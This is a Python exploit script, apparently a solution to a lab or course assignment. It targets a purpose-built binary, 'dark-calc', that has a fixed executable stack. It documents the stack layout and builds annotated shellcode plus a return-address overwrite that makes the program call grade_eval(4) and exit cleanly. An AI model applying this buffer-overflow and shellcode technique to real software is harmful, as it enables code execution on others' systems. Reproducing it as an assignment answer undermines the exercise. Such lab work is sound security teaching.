#!/usr/bin/env python3
"""Task 2: stack-code-execution exploit for attack/dark-calc.

Goal: inject machine code onto the stack and redirect rip to it so that the
program prints "Hope A will be your grade!" by calling grade_eval(4), then
exits cleanly (no segfault).

Why the stack address is fixed
------------------------------
dark-calc is a non-PIE binary with a constructor `init_fixed_stack` (0x401add)
registered in .init_array.  It mmap()s the call stack at a FIXED address with
PROT_READ|WRITE|EXEC:

    mmap(0x721000000000, 0x802000, PROT_READ|PROT_WRITE|PROT_EXEC,
         MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0)

and `__wrap_main` (0x401c0e) switches rsp to fixed_stack_top = 0x721000801000
before calling main().  Walking the prologues down to input():

    __wrap_main: rsp = 0x721000801000, call main  -> [0x721000800ff8]
    main:        push rbp                          -> rbp = 0x721000800ff0
                 call input                        -> [0x721000800fe8]
    input:       push rbp                          -> rbp = 0x721000800fe0
                 sub rsp,0x10                      -> rsp = 0x721000800fd0

so expression[] lives at 0x721000800fd0 (16 bytes), followed by the saved rbp
(8 bytes) and the saved return address (8 bytes).

Shellcode (24 bytes)
--------------------
    bf 04 00 00 00   mov edi, 4          # grade = 4
    b8 87 1a 40 00   mov eax, 0x401a87   # address of grade_eval
    90 90 90 90      nop x4              # pad so that `call rax` sits at offset 14
    ff d0            call rax            # return address lands at offset 16 (saved rbp)
    6a 3c            push 0x3c           # 60 = SYS_exit
    58               pop rax
    31 ff            xor edi, edi        # exit status 0
    0f 05            syscall             # exit(0) -- clean termination

Why the nops before `call rax`?
grade_eval's frame base is 0x721000800fe0, so it stores the `grade` argument at
[rbp-4] = 0x721000800fdc = shellcode + 12.  If `call rax` were at offset 10, its
return address would be offset 12, i.e. exactly the 4 bytes that grade_eval
overwrites -- execution would then fall into corrupted bytes and segfault.
Placing `call rax` at offset 14 makes the return address point at offset 16
(the saved-rbp area), which grade_eval does not corrupt, so the syscall-exit
sequence at offset 16 survives and the process exits with status 0.
"""
import sys

shellcode = (
    b"\xbf\x04\x00\x00\x00"   # mov edi, 4
    b"\xb8\x87\x1a\x40\x00"   # mov eax, 0x401a87  (grade_eval)
    b"\x90\x90\x90\x90"       # nop x4 (place `call rax` at offset 14)
    b"\xff\xd0"               # call rax
    b"\x6a\x3c"               # push 0x3c        (60 = SYS_exit)
    b"\x58"                   # pop rax
    b"\x31\xff"               # xor edi, edi     (exit status 0)
    b"\x0f\x05"               # syscall
    b"\x90"                   # pad to 24 bytes
)
assert len(shellcode) == 24

buf = 0x721000800FD0  # address of expression[] (fixed stack)

# 24 bytes of code (16-byte buffer + 8-byte saved rbp) + return address.
payload = shellcode + buf.to_bytes(8, "little")

sys.stdout.buffer.write(payload)
